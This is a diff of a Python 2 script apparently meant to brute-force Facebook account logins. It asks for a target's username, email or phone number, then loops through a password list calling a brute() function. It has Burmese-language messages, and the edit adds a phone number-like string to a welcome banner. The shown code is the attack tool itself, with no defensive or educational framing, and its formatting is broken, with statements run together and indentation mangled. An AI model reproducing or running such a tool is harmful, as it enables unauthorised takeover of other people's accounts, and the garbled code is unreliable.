@@ -1,5 +1,6 @@
 #!/usr/bin/env python# -*- coding: UTF-8 -*- 
-import sysimport mechanize
+import sys
+import mechanize
 import cookielib
 import random 
 email = str(raw_input("Enter the Facebook Username (or) Email (or) Phone Number : "))
@@ -35,7 +36,7 @@ print("Password မေတြ႕ဘူး")
         for password in passwords:		password = password.replace("\n","")	
           brute(password) 	
           #welcome
-          def welcome():	wel = """  Ericမွeditလုပ္ထားပါသည္ ေက်းဇူးတင္ပါသည္"""
+          def welcome():	wel = """  Ericမွeditလုပ္ထားပါသည္ ေက်းဇူးတင္ပါသည္09780190230"""
             total = open(passwordlist,"r")	
             total = total.readlines()
             print wel 	
